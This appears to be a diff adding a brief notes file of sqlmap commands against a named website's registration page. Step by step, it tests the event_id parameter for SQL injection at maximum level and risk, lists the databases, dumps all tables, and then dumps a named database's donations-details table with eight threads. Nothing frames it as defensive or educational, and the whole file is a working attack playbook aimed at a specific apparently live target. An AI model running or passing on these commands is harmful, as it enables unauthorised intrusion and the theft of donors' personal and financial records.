@@ -1,0 +1,19 @@
+> To check If vulnerable:
+
+python3 sqlmap.py -u https://www.artofliving.online/registration.php?event_id=718709 -p event_id --level 5 --risk 3
+
+
+> To get all database names:
+
+python3 sqlmap.py -u "https://www.artofliving.online/registration.php?event_id=718709" --dbs
+
+
+> To dump all tables in <databaseName>:
+
+python3 sqlmap.py -u https://www.artofliving.online/registration.php?event_id=718709 -D <dbname> --dump-all --batch
+
+
+> To dump all the columns and rows in -D <databaseName> -T <tableName>
+
+python3 sqlmap.py -u "https://www.artofliving.online/registration.php?event_id=718709" -D vvki_in_civicrm --dump -T crf_donations_details --batc
+h --threads 8
